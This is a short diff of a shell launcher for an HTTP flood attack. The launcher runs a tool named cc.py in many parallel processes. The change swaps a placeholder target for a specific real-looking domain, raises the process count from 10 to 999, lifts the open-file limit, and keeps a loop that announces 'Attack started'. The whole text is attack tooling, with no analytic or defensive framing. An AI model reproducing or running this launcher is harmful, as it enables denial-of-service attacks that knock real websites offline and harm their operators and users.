@@ -6,13 +6,13 @@
 #  Lastly run this script
 #
 #the command you want to exec
-atk_cmd="python3 cc.py -url http://target.com -v 4 -s 60"
+atk_cmd="python3 cc.py -url https://bbos.cat -v 5 -s 999"
 
 #number of process that you want
-process=10
+process=999
 
 #change the system limit
-ulimit -n 999999
+ulimit -n 9999999
 
 echo Attack started
 for ((i=1;i<=$process;i++))
